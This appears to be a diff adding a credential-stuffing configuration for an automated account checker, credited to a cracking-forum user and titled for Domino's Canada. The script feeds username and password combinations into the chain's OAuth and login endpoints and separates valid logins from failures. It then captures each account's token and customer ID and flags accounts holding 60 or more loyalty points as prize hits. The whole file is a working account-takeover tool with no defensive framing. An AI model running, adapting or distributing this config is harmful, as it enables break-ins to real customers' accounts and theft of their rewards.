@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "DOMINOS CA",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-08T18:00:03.9796728-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "SLAYA ON C.TO",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.dominos.ca/as/token.oauth2" 
+  CONTENT "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"token_type\":\"Bearer\",\"" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username & password combination.\",\"" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\",\"" -> VAR "TOKEN" 
+
+REQUEST POST "https://order.dominos.ca/power/login" 
+  CONTENT "loyaltyIsActive=true&rememberMe=false&u=<USER>&p=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+
+PARSE "<SOURCE>" LR ",\"CustomerID\":\"" "\",\"" -> VAR "CID" 
+
+REQUEST GET "https://order.dominos.ca/power/customer/<CID>/loyalty?_=1582423102992" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+
+PARSE "<SOURCE>" LR "VestedPointBalance\":" ",\"" CreateEmpty=FALSE -> CAP "POINTS" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<POINTS>" GreaterThan "59" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<POINTS>" LessThan "60" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"token_type\":\"Bearer\",\"" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username & password combination.\",\"" 
+
